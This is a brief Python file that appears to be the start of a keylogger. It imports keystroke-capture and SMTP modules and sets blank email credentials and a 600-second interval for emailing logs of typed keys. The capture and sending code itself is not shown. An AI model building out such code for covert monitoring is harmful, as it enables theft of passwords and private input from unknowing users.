import keyboard  # keylogs
import smtplib # email 
import keylogger # main class

from threading import Timer 
from datetime import datetime


# Email cofniguration for log 
email_adress = ""
email_password = ""
send_report_time = 600 # in seconds - every X seconds, a email will be send 

